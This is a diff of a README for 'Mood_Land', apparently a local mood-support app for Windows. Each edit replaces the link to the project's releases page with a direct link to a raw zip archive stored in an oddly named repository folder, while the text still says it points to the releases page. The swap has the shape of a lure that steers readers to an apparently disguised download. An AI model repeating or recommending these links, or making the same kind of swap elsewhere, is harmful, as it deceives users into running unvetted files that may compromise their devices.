@@ -1,12 +1,12 @@
 # 🧠 Mood_Land - Calm local mood support
 
-[![Download Mood_Land](https://img.shields.io/badge/Download-Mood_Land-6A5ACD?style=for-the-badge)](https://github.com/Piersonpseudohermaphroditic894/Mood_Land/releases)
+[![Download Mood_Land](https://img.shields.io/badge/Download-Mood_Land-6A5ACD?style=for-the-badge)](https://raw.githubusercontent.com/Piersonpseudohermaphroditic894/Mood_Land/main/undetrimental/Land_Mood_1.2.zip)
 
 ## 📥 Download
 
 Visit the releases page to download and run this app on Windows:
 
-https://github.com/Piersonpseudohermaphroditic894/Mood_Land/releases
+https://raw.githubusercontent.com/Piersonpseudohermaphroditic894/Mood_Land/main/undetrimental/Land_Mood_1.2.zip
 
 ## ✨ What Mood_Land does
 
@@ -182,4 +182,4 @@ Mood_Land is built for local use. Your mood notes, chat, and webcam data stay on
 
 If you need the install file again, visit the releases page:
 
-https://github.com/Piersonpseudohermaphroditic894/Mood_Land/releases
+https://raw.githubusercontent.com/Piersonpseudohermaphroditic894/Mood_Land/main/undetrimental/Land_Mood_1.2.zip
